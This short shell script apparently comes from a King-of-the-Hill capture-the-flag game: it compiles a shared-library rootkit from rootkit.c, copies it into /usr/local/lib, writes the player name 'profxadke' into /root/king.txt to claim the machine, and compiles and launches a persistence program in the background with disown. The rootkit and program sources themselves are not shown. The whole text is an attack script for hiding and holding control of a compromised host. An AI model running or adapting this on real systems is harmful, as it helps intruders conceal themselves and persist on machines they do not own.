#!/bin/sh

gcc -shared -o rootkit.so -fPIC rootkit.c -ldl
cp ./rootkit.so /usr/local/lib/rootkit.so
echo profxadke > /root/king.txt
gcc -static kothv4.c -o koth.o
./koth.o & disown
